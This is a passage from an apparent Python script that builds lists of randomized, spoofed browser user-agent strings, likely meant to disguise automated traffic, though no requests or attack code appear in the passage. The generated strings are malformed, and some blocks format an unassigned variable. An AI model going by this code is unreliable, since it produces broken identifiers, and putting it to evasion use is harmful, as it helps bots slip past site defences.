    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    #Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; WOW64; Trident/7.0; rv:11.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='like Gecko'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76
    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Vivaldi/5.6.2867.50
    
    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Vivaldi/5.6.2867.50'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    #Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
    
    
    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64; x64; rv:108.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Gecko/20100101 Firefox/108.0'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
    #Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36
    
    aa='Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 6.0.1; SM-G532G Build/MMB29T'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/63.0.3239.83 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    #Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36
    
    aa='Mozilla/5.0 (Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 12; SAMSUNG SM-G991B'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    #Mozilla/5.0 (SMART-TV; Linux; Tizen 2.4.0) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv Safari/538.1
    aa='Mozilla/5.0 (SMART-TV; Linux; Tizen 2.4.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['SMART-TV; Linux; Tizen 2.4.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/1.1 tv Safari/538.1'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
   
   #Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF
   
    aa='Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
   
   #Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF
   
    aa='Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
   #Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF
   
    aa='Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
   
   #Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36
    aa='Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 11; SAMSUNG SM-A515F'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
   
   #Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF
    aa='Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
   
   #NEW#AGENT
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='RMX2185 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' 4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 '
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (SMART-TV;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Linux; Tizen 2.4.0)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/538.1'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; U; Android 10; '
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Aquaris X2 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=' QKQ1.200216.002) AppleWebKit/537.36 (KHTML, like Gecko) Versi/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9 .3'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 9;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Lenovo TB-X605L Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='PKQ1.190319.001 ) AppleWebKit/537.36 (KHTML, seperti Gecko) JioBrowser/1.4.7 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='74.0.3729.136 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    #
	
    aa='Mozilla/5.0 (Linux; U; Android 5.1.1; zh-cn;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['vivo Xplay5A Build/LMY47V)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/534.30 (KHTML, seperti Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Versi/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['SAMSUNG SM-F900U Build/PPR1.180610.011'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/108.0.0.0 Safari/537.36 Vivaldi/5.5.2805.50'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 9 Pro)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/105.0.5195.19 Mobile Safari/537.36 TwitterAndroid'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 12;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['V2149 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/103.0.5060.53 Mobile Safari/537.36uc mini browser3.0'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    a='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Infinix X6811 Build/RP1A.200720.011; wv'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 12;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['2201116PG'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['RMX2185 Build/QP1A.190711.020; wv)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
